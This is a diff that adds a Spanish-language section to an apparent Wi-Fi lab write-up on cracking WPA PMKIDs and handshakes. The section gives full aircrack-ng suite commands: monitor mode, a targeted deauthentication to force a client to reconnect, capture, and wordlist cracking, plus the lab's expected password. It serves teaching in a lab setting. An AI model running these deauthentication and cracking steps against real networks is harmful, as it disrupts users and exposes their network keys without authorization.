@@ -439,6 +439,56 @@ hashcat -m 22000 solo_pmkid.22000 /usr/share/wordlists/rockyou.txt -n 1 -u 1 -T 
 Si se prueba con un diccionario propio, comprueba que contiene la clave.
 hashcat no avisa: simplemente termina como `Exhausted`.
 
+### d) Vía alternativa con la suite aircrack-ng
+
+El mismo escenario se resuelve solo con la suite aircrack-ng, sin hcxtools.
+Como hay un cliente asociado, se aprovecha un **deauth** para forzar su
+reasociación: el AP responde con un M1 que (en este lab, con el hostapd
+parcheado) lleva el **PMKID**, y acto seguido se completa el **handshake
+4-way**. airodump-ng guarda ambos en el mismo `.cap`.
+
+```bash
+# Monitor y localización
+sudo airmon-ng start wlan0               # -> wlan0mon
+sudo airodump-ng wlan0mon --band g       # he_pmkid: CH 11, con una estación
+
+# Capturar fijando canal y BSSID (anota la MAC del cliente en STATION)
+BSSID=<BSSID_PMKID>
+sudo airodump-ng -c 11 --bssid $BSSID -w cap_pmkid wlan0mon
+```
+
+airodump-ng captura de forma **pasiva**. Si el cliente ya estaba asociado
+antes de empezar, puede que no se vea aún ni el handshake ni el PMKID: hay que
+provocar una reconexión.
+
+```bash
+# Desde otra terminal: deauth dirigido al cliente (-c) o a todos
+CLIENT=<MAC_CLIENTE>
+sudo aireplay-ng -0 3 -a $BSSID -c $CLIENT wlan0mon
+```
+
+Al reconectarse el cliente, airodump-ng muestra arriba a la derecha
+`WPA handshake: <BSSID>`; las versiones recientes también anuncian el PMKID
+con un `PMKID found`. Con cualquiera de los dos ya se puede crackear:
+
+```bash
+aircrack-ng -w /usr/share/wordlists/rockyou.txt -b $BSSID cap_pmkid-01.cap
+```
+
+aircrack-ng (desde la 1.4) lee el PMKID del M1 **y** el MIC del handshake. En
+el encabezado indica qué material tiene, por ejemplo
+`1 handshake, with PMKID`. Si solo quieres convertirlo al formato de hashcat,
+sirve el mismo `hcxpcapngtool -o hash.22000 cap_pmkid-01.cap` de la sección 3.
+
+**Resultado esperado:** `butterfly`.
+
+**Diferencia con hcxtools.** hcxdumptool consigue el PMKID **activamente**:
+se asocia él mismo con una MAC inventada y le basta el M1 del AP (por eso en
+`he_pmkid_nc`, sin clientes, funciona igual). La vía aircrack-ng es **pasiva +
+deauth**: necesita que un cliente legítimo se reasocie para que el AP emita ese
+M1 y para capturar el handshake. Por eso aquí, con cliente, las dos funcionan;
+en `he_pmkid_nc` solo la primera.
+
 ### Fundamento técnico
 
 - **Qué es el PMKID.** Es un identificador de la PMK pensado para el *roaming*
